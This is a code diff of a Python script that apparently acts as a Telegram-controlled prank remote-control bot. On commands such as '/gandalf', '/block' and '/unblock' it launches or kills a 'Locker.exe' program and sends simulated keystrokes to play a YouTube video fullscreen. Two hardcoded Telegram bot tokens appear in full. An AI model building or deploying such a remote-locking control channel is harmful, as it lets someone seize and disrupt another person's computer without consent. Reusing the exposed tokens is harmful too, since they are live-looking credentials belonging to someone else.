@@ -8,9 +8,12 @@ import ctypes
 import os
 
 api_url = 'https://api.telegram.org/'
-token = 'bot1462769482:AAEU84lWytoJNXkt5bf6rVGjX_fqpqV71ds'
+token = 'bot1462769482:AAEZUbtYckOhLQEB5XTgs21gHLWWN_LaAAU'
 url = 'https://api.telegram.org/' + token + '/'
 gandalf_link = 'https://youtu.be/Sagg08DrO5U'
+
+start_locker = 'start Locker.exe'
+disable_locker = 'taskkill /f /im Locker.exe'
 
 last_message_id = -1
 
@@ -40,15 +43,14 @@ def msg_text(msg):
     return ''
 
 def run_gandalf():
-    time.sleep(1)
-    keyboard.press_and_release('win+r')
-    time.sleep(1)
-    keyboard.write('chrome.exe')
-    keyboard.press_and_release('enter')
     time.sleep(3)
+    os.system(disable_locker)
+    os.system(start_locker)
+    keyboard.press_and_release('win+r')
+    time.sleep(0.1)
     keyboard.write(gandalf_link)
     keyboard.press_and_release('enter')
-    time.sleep(10)
+    time.sleep(7)
     keyboard.press_and_release('f')
 
 
@@ -67,9 +69,15 @@ while True:
 
         if msg_text(msg) == '/gandalf':
             print(master_id)
-            #os.system('Stand_by.vbs')
+            os.system(start_locker)
             run_gandalf()
         
+        if msg_text(msg) == '/block':
+            os.system(start_locker)
+
+        if msg_text(msg) == '/unblock':
+            os.system(disable_locker)
+
         if msg_text(msg) == '/ping':
             send_message(master_id, '.')
 
